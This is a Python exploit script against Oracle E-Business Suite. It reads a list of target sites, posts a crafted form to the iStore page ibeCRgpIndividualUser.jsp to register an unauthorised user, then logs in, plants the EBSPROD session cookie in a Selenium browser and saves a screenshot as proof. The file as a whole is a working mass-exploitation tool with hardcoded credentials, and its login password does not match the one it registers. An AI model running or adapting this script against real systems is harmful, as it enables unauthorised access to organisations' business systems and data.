import requests
import sys
import json
from selenium import webdriver
from PIL import Image
from colorama import init, Fore, Back, Style
import re
init(convert=True)

def register():
    list_cve = sys.argv[1]
    with open(list_cve, 'r') as file:
        for target in file:
            end_point = target[:target.rfind("/")]
            for i in range(1):
                try:
                    burp0_url = end_point + "/ibeCRgpIndividualUser.jsp"
                    burp0_data = {"ds": "0", "category": "template", "ref": '', "noshowcontact": "Y", "target": "ibeCRgdEnrollFail.jsp?a=b", "_hideConfirmation": "Y", "tmpl_ut_id": "10041.00000", "ref": '', "jtt_uua": "n", "category": "template", "tmpl_action": "browse", "usertype_template": "STORE_REG_B2C_CREATE_D?tmpl_id=10060", "tmpl_ut": "IBE_INDIVIDUAL", "tmpl_ut": "IBE_INDIVIDUAL", "utHandler": "oracle.apps.ibe.um.RegisterIndividual", "tmp": "STORE_REG_CONTAINER_D", "_sendConfirmationEmail": "N", "_regErrorPage": "ibeCRgdError.jsp", "listenrollment": "true", "regSubmit": '', "emailIsUsername": "N", "firstname": "testaccu1", "middlename": '', "lastname": "0x7", "user.email": "el7ot2085@gmail.com", "workPhCountryCode": '', "workAreaCode": '', "workNumber": '', "workExtension": '', "homePhCountryCode": '', "homeAreaCode": '', "homeNumber": '', "homeExtension": '', "faxPhCountryCode": '', "faxAreaCode": '', "faxNumber": '', "faxExtension": '', "user.userid": "testaccu7", "user.verifypassword": "@D7k_2023", "confirmPassword": "@D7k_2023", "ibe_listenrollment": "false", "subscriptions": "10060", "subscriptions": "10080"}
                    p = requests.post(burp0_url, data=burp0_data)
                    if "No accessible site found" in p.text:
                        print(Fore.GREEN + "User created sucessfully, login: " + Style.RESET_ALL + end_point +"/AppsLocalLogin.jsp")
                        login(end_point)
                    # elif "All Sites" in p.text:
                    #     login(end_point)
                    #     print(Fore.GREEN + "User created sucessfully, login: " + Style.RESET_ALL + end_point +"/AppsLocalLogin.jsp")
                    else:
                        print(Fore.RED +"Failed to register account on: " + Style.RESET_ALL + end_point)
                except requests.exceptions.RequestException as e:
                    print(Fore.RED +"Time out for: " + Style.RESET_ALL + burp0_url)
                    print("#####################################################################")


def filter(res):
    x = res
    login_url = re.findall("(http.*?)'",x)  
    Filter = login_url[0]
    Filter1 = Filter.replace("x3a",":")
    Filter2 = Filter1.replace("x2f","/")
    Filter3 = Filter2.replace("x2e",".")
    Filter4 = Filter3.replace("x5f","_")
    Filter5 = Filter4.replace("x3f","?")
    Filter6 = Filter5.replace("x3d","=")
    Filter7 = Filter6.replace("\\","")
    return Filter7


def login(end_point):
    burp0_url = end_point + "/AppsLocalLogin.jsp?"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "X-Service": "AuthenticateUser", "Content-Type": "application/x-www-form-urlencoded", "Content-Lentgth": "88", "Connection": "close"}
    burp0_data = {"username": "testaccu7", "password": "P@$$w0rd", "_lAccessibility": "N", "displayLangCode": "US", "langCode": "US"}
    r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
    rr = dict(r.headers)
    rrr = json.dumps(rr)
    header = rrr[163:189]
    #Prod_header = "EBSPROD=" +header
    #headers = {'Cookie': Prod_header}
    domain_list = re.findall("(?<=domain=)(.*?;)",rrr)
    domain_semi = domain_list[0]
    domain = domain_semi[:domain_semi.rfind(";")]
    driver = webdriver.Chrome(executable_path = 'C:\chromedriver\chromedriver.exe')
    url = filter(r.text)
    driver.get(url)
    cookie = {'name': 'EBSPROD', 'value': header, 'domain': domain}
    driver.add_cookie(cookie)
    driver.get(url)
    pic = re.findall("(?<=\:\/\/)(.*?/)", end_point)
    pic_semi = pic[0]
    pic_name = pic_semi[:pic_semi.rfind("/")]
    driver.save_screenshot(pic_name+'.png')


if __name__=='__main__':
    register()
